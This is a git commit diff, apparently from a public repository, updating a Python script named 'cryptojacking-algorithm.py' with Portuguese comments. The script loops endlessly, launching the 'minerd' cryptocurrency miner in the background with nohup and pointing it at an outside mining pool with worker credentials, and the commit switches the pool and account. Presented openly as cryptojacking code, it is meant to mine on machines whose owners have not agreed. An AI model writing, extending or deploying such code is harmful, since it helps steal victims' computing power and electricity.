87b519a259aab177b2f0933d6269032c9ff2f618
cihuuy <95659029+cihuuy@users.noreply.github.com>
2023-03-12 09:48:33 +0700

    Update cryptojacking-algorithm.py

--- cryptojacking-algorithm.py
+++ cryptojacking-algorithm.py
@@ -4,7 +4,7 @@ import time
 # Fica em loop para minerar a criptomoeda
 while True:
     # Executa o comando de mineração
-    os.system("nohup minerd -a sha256 -o stratum+tcp://pool.bitcoin.com:3333 -u usuario.workername -p senha &")
+    os.system("nohup minerd -a sha256 -o stratum+tcp://us.mining.prohashing.com:3335 -u sbj.workername -p a=sha-256 &")
 
     # Dorme por 1 hora antes de reiniciar a mineração
     time.sleep(3600)
